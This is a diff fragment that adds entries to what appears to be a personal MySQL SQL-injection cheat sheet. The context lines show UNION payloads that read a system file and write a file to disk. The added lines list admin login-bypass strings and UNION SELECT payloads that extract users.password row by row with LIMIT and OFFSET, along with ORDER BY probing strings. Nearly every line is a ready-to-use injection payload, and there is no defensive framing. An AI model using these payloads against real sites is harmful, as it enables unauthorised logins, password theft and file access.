@@ -57,3 +57,22 @@ MySql injection, UNION operator
         AND 1=0 UNION SELECT LOAD_FILE('C:\\boot.ini'),NULL,NULL #'
     Write files
         AND 1=0 UNION SELECT 'bad content',NULL,NULL INTO OUTFILE 'C:\\random_file.txt' #'
+
+form to log in as admin
+	' or ( 1=1 and username='admin');
+	admin' --
+
+Tricks to read data
+    Exfiltrate the different rows of the table. First, find the number of rows in the table:
+    *aa' UNION SELECT count(*), users.password FROM users; --*
+
+    Then select each row:
+    *aa' UNION SELECT users.password, users.password FROM users LIMIT 1; --*
+    *aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 1; --*
+    *aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 2; --*
+
+
+    Exfiltrate the different rows of the table:
+        *' or 'x'='x' order by 1 desc --
+        ' or 'x'='x' order by 2 desc --
+        ...*
